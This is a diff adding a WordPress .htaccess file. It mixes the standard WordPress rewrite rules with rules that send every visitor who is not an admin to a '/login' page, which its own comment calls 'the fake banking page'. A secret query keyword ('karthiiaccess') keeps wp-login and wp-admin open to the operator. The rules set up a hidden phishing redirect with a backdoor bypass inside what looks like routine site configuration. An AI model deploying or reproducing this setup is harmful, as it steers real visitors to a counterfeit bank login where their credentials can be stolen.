@@ -1,0 +1,28 @@
+RewriteEngine On
+RewriteCond %{HTTP_COOKIE} wordpress_logged_in
+RewriteRule ^wp-login.php$ /wp-admin [R=301,L]
+
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+
+# If admin is accessing with ?karthiiaccess, allow WordPress login
+RewriteCond %{QUERY_STRING} karthiiaccess
+RewriteRule ^wp-login.php$ /wp-admin [L,R=302]
+
+# If the user is NOT admin, redirect to the fake banking page
+RewriteCond %{QUERY_STRING} !karthiiaccess
+RewriteCond %{REQUEST_URI} !^/login$
+RewriteCond %{REQUEST_URI} !^/signup$
+RewriteCond %{REQUEST_URI} !^/wp-admin
+RewriteCond %{REQUEST_URI} !^/wp-login.php
+RewriteRule ^.*$ /login [L,R=302]
+
+# Standard WordPress rules
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+# END WordPress
